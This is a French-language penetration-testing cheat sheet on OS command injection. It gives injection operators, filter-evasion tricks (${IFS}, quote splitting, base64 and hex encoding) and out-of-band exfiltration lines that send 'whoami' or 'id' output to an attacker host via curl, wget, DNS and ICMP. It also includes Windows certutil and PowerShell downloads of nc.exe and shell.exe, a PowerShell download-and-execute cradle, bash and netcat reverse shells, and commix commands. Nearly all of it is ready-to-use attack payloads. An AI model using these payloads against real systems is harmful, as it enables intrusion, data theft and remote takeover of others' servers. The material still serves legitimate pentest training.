# 22 — Command Injections

## Objectifs
Injecter des commandes OS via les entrées utilisateur, contourner les filtres (blacklist, caractères, espaces) et exfiltrer des données hors bande.

---

## 1. Opérateurs d'injection

| Opérateur | Caractère | URL encodé |
|---|---|---|
| Semicolon | `;` | `%3b` |
| New line | `\n` | `%0a` |
| Background | `&` | `%26` |
| Pipe | `\|` | `%7c` |
| AND | `&&` | `%26%26` |
| OR | `\|\|` | `%7c%7c` |
| Sub-shell | `` ` ` `` | `%60%60` |
| Sub-shell | `$()` | `%24%28%29` |

```bash
# Tests
127.0.0.1; id
127.0.0.1 | id
127.0.0.1 || id
127.0.0.1 && id
$(id)
`id`
```

---

## 2. Détection

```bash
# Point d'entrée (ping, nslookup, convert, etc.)
?ip=127.0.0.1
?host=example.com
?file=report.pdf

# Injection de base
127.0.0.1; whoami
127.0.0.1 && whoami
127.0.0.1 | whoami

# Blind (sans sortie)
127.0.0.1; sleep 5
127.0.0.1; ping -c 2 <LHOST>
```

```bash
# Automatisation
commix --url="http://<TARGET>/?ip=127.0.0.1" --batch
```

---

## 3. Bypass de filtres

### Espaces
```bash
# Tab
%09
# ${IFS}
${IFS}id
# Braces
{cat,/etc/passwd}
# $IFS
cat$IFS/etc/passwd
# Redirection
cat</etc/passwd
```

### Caractères filtrés
```bash
# ; filtré → utiliser %0a, &&, |
127.0.0.1%0aid

# / filtré → ${PATH:0:1}
cat ${PATH:0:1}etc${PATH:0:1}passwd

# . filtré
# espaces filtrés
{ls,-la}
```

### Mots-clés filtrés (blacklist)
```bash
# Concaténation
w'h'o'am'i
w"h"o"am"i
\w\h\o\a\m\i
# Variables
a=who;b=ami;$a$b
# Substitution
$(echo d2hvYW1p | base64 -d)
```

### Encodage
```bash
# Base64 + bash
echo 'cat /etc/passwd' | base64
bash -c "$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)"

# Hex
echo 636174202f6574632f706173737764 | xxd -r -p | bash

# Variable shell
${@:0:1}   # ?
```

### Contournement de la casse
```bash
# Windows (case-insensitive de toute façon)
W h O a M i
# Bash
who$()ami
```

---

## 4. Exécution blind — Out-of-Band

### Via HTTP
```bash
# Curl / wget
127.0.0.1; curl http://<LHOST>:8000/$(whoami)
127.0.0.1; wget http://<LHOST>:8000/$(id | base64 -w0)

# Listener
python3 -m http.server 8000
nc -lvnp 8000
```

### Via DNS
```bash
127.0.0.1; nslookup $(whoami).<DOMAIN>
127.0.0.1; dig $(id | base64 -w0).<DOMAIN>
# Attaquant : tcpdump -i tun0 port 53 -A
```

### Via ICMP
```bash
127.0.0.1; ping -c 1 -p $(id | xxd -p | head -c 32) <LHOST>
sudo tcpdump -i tun0 icmp -X
```

### Time-based
```bash
127.0.0.1; sleep 5
127.0.0.1; [ $(whoami) = root ] && sleep 5
```

---

## 5. Windows

```cmd
127.0.0.1 & whoami
127.0.0.1 | whoami
127.0.0.1 && whoami
127.0.0.1 || whoami

:: PowerShell
127.0.0.1; powershell -c whoami
127.0.0.1 & powershell -enc <BASE64>

:: Téléchargement
127.0.0.1 & certutil -urlcache -f http://<LHOST>/nc.exe C:\Temp\nc.exe
127.0.0.1 & powershell IWR http://<LHOST>/shell.exe -OutFile C:\Temp\shell.exe
```

### Encodage PowerShell
```bash
echo -n 'IEX(New-Object Net.WebClient).DownloadString("http://<LHOST>/p.ps1")' | iconv -t UTF-16LE | base64 -w0
# powershell -enc <BASE64>
```

---

## 6. Filtres côté application

- **Validation stricte** : `^[0-9.]+$` → pas d'injection, chercher d'autres paramètres.
- **Échappement** : vérifier si `;` devient `\;`.
- **WAF** : tester encodages, casse, doubles encodages.
- **allowlist de binaires** : tester arguments (ex. `ping -c 1 ; id`).

```bash
# Tester si les caractères sont échappés
?ip=127.0.0.1%3Bid
?ip=127.0.0.1%253Bid
```

---

## 7. Commix

```bash
# Basique
commix --url="http://<TARGET>/?ip=127.0.0.1" --batch

# POST
commix --url="http://<TARGET>/ping" --data="ip=127.0.0.1" --batch

# Avec cookie
commix --url="http://<TARGET>/?ip=1" --cookie="PHPSESSID=abc" --batch

# OS shell
commix --url="http://<TARGET>/?ip=1" --os-shell

# Techniques
commix --url="..." --technique=classic --level=3
```

---

## 8. Après l'injection

```bash
# Reverse shell
127.0.0.1; bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'
127.0.0.1; nc -e /bin/bash <LHOST> 4444

# Windows
127.0.0.1 & powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/rev.ps1')"
```

---

## Checklist
- [ ] Point d'injection identifié
- [ ] Opérateurs testés (`;`, `|`, `&&`, `$()`)
- [ ] Filtres cartographiés (caractères bloqués)
- [ ] Bypass appliqué (IFS, concaténation, encodage)
- [ ] Exécution confirmée (sortie ou OOB)
- [ ] Reverse shell obtenu
- [ ] Preuves et payloads sauvegardés

## Aide-mémoire
| Besoin | Payload |
|---|---|
| Espace | `${IFS}`, `%09`, `{cmd,arg}` |
| `/` | `${PATH:0:1}` |
| `;` | `%0a`, `&&`, `\|` |
| Mot filtré | `w'h'o'ami`, `$a$b` |
| Blind | `curl http://LHOST/$(id)`, `sleep` |
| Windows | `&`, `\|`, `powershell -enc` |
